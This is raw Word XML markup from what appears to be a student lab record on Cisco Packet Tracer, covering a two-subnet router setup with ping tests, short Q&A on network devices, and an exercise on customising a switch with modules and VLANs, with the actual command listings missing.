    <w:p w14:paraId="00E45AE8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="53803226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810BAA9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC2 → IP 192.168.1.3 / 255.255.255.0, Gateway 192.168.1.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34D5EF6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E4E7F51" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC3 → IP 192.168.2.2 / 255.255.255.0, Gateway 192.168.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7476F6AD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="12E24A2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E438506" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PC4 → IP 192.168.2.3 / 255.255.255.0, Gateway 192.168.2.1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F52FC43" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>For Router:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DA4825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B280715" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Router interface GigabitEthernet0/0/0 → 192.168.1.1 / 255.255.255.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A4B08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E152DA5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Router interface GigabitEthernet0/0/1 → 192.168.2.1 / 255.255.255.0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D84DD7F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click on Router, go to the CLI tab, and enter the following commands:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3220B5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="071DBC37" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Test Connectivity</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ACA3238" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>These test the router and cross-network connectivity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59F55693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4072324" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>On PC1, open the Command Prompt and type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DBD879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D0C5CDE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>On PC3, open the Command Prompt and type:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E53925B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Successful replies confirm that inter-network communication is functioning</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27228181" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>correctly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CF0089" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D547D55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1D58FF92" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus, a simple network topology with one router, two switches, and four</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5147C5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PCs was successfully designed and configured in Cisco Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B3B5890" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Successful ping replies verified proper connectivity between all devices in both</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC159DD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AA14D0C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4915B66D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. What is Cisco Packet Tracer?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6104511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7DA86D05" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Cisco Packet Tracer is a network simulation tool used to design, configure, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="416B4E74" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>test computer networks virtually.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CAD98B9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. What is network topology?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC8D037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4E8B41C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network topology is the physical or logical arrangement of devices and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E525FC1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>connections in a computer network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="293030D4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. What are the basic devices used in a simple network topology?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CDF3F5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5014C7A8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>The basic devices include:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="483C6713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04B2515" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PCs (Personal Computers)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DDA8705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37AB656" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Switches</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45B1F442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6F45AEC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Routers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7750EC7E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68D9907" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Network cables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31349A1B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. What is the function of a switch in a network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A08BB53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C073DDC" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A switch connects multiple devices within the same local area network (LAN)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CDD118A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and forwards data to the correct destination.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57F6B532" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. What is the role of a router in a network?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9225BE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37BEB70D" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>A router connects different networks and routes data packets between them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A813D13" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B10C317" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Ex.No:10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D19243F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CUSTOMIZE SWITCH WITH NETWORK MODULES USING CISCO</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18904507" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PACKET TRACER</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B4E399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438C5E6A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>To Customize Switch with Network Modules using Cisco Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0EEFAE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Procedure:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="070DEAFD" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>1. Open Cisco Packet Tracer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BFC9A4B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4B7F36E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Launch Cisco Packet Tracer on your computer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0002A80B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>2. Add a Switch to Your Workspace</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F562C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0DA0E6E" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In the device toolbar (usually on the left side of the screen), locate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28687FDB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>the "Switches" section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BFDBE1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0714CEB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Drag and drop a switch model onto the workspace.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A0BCCB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>3. Access the Switch's Physical Layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3277A764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35D7388" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click on the switch in the workspace to open its configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2325F7D5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02A16E8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61A548A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Navigate to the "Physical" tab to see the switch's physical layout</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B29F2A6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>and modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="534EA3D7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AF043A1" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>4. Add Network Modules</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5F26C5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35F1EA5" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>In the "Physical" tab, you might see options to add or modify</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="532779EE" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>network modules.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7D7F12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580A6AF" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click on the slot where you want to add a module.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13877CE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4FCFE1B7" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Drag the module from the list of available modules and drop it into</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="751318F9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>the slot on the switch.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78B1ED15" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CE13CBB" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>5. Configure the Modules and save the configuration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E3C6BF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84C6E0C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>After adding the module, switch to the "CLI" tab in the switch's</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="772681F8" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>configuration window.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B550F7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93F1230" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Here, you can configure the ports provided by the module. For</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73A979A0" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>example, you can set IP addresses, VLAN configurations, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47ABE630" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>other settings for the new interfaces.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AA8B0B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CONFIG THE HOSTNAME OF THE SWITCH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A4E30A" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SET THE MESSAGE OF THE DAY(MOTD) BANNER FOR THE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA6B965" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SWITCH:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20232B77" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>CONFIG THE LINE CONSOLE PASSWORD AND ENABLE SECRET</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00472A8F" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>PASSWORD:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45385783" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D8212D6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>SHOW THE VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2219603B" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>NAMING THE VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="428D6BA9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4667FD06" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ASSIGN INTERFACE TO VLAN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E62A5B9" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>ASSIGN IP ADDRESS TO VLAN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497C7C2E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47B4BF9C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Thus successfully configured and customize switch with network</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C27A7C6" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>modules using cisco packet tracer has been verified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="185C4A8C" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A49AD4" w14:textId="77777777" w:rsidR="00980B9C" w:rsidRDefault="00626251">
      <w:pPr>
        <w:spacing w:after="40"/>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
